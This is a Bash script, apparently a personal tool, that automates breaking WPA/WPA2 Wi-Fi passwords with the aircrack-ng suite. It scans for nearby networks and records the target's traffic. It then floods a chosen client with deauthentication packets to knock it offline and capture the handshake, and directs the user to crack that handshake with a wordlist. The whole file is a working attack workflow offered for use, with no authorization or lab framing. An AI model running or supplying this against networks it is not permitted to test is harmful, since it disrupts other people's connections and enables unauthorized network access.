#!/bin/bash
#
# It's to break WPA/WPA2 password in a Wi-fi network
#
# Gabriel Richter <gabrielrih@gmail.com>
# Last Modification: 
#
# More information: http://gabrielrih.wixsite.com/wiki/invadir-rede-wi-fi-com-criptografia-wpa2
#


# CHANGELOG.
# v1     	Basic functions

# USAGE
USE="Usage: $0 [interface]

[Parameters]
interface       Fill PROMISCUOUS interface (Eg. mon0)

Example:	$0 mon0

OBS: You MUST run setPromiscuousInterface.sh before"

# Checking parameters number
if [ $# != 1 ]
then
	echo "$USE"
	exit 1
fi

# Check if is sudo
user=$(whoami)

if [ $user != 'root' ]
then
        echo "Please, run as sudo"
        exit 1
fi

# Variables
interface=$1
tmpDir="tmpWPA"                         # used to save CAP files
outNameFile="CrackMeWPA"                # used to airodump-ng to record network packets
finalNameFile=$outNameFile"-01.cap"     # used to aircrack-ng to break WEP password

# Create temporary directory
if [ ! -d $tmpDir ]
then
    mkdir $tmpDir
else
    rm -R $tmpDir
    mkdir $tmpDir
fi

# Start airodump to check if have any WPA/WPA2 network
xterm -e "airodump-ng -a $interface" & AIRODUMPPID=$!

echo "STEP 1: You need check if there is any WPA/WPA2 network aroung you."
echo "If you find it press ENTER"
read anything

echo "STEP 2: Copy BSSID and a MAC address of some PC connected in the target BSSID. Please, informe it bellow"
echo "BSSID: \c"; read bssid
echo "MAC Address: \c"; read mac

# Kill airodump-ng process
kill ${AIRODUMPPID}

# Start airodump to check if have any WPA/WPA2 network
xterm -e "airodump-ng --bssid $bssid -a -w $tmpDir/$outNameFile $interface" & AIRODUMPPID=$!

# Start aireplay-ng to force MAC to disconnect of the network and to bring us a HANDSHAKE
xterm -e "aireplay-ng -0 0 -a $bssid -c $mac $interface --ignore-negative-one" & AIREPLAYPID=$!

echo "WHAT'S HAPPENING:"
echo "- The airodump-ng is capturing network traffic"
echo "- The aireplay is trying to disconnect $mac device to force a HANDSHAKE"
echo ""

echo "Now, you must execute 'aircrack-ng $tmpDir/$finalNameFile -w [wordlist]' or run 'aircrackTestDictionary.sh'"
echo "OBS: When you find a HANDSHAKE you can stop airodump and aireplay"
echo ""
echo "Good luck!"

exit 0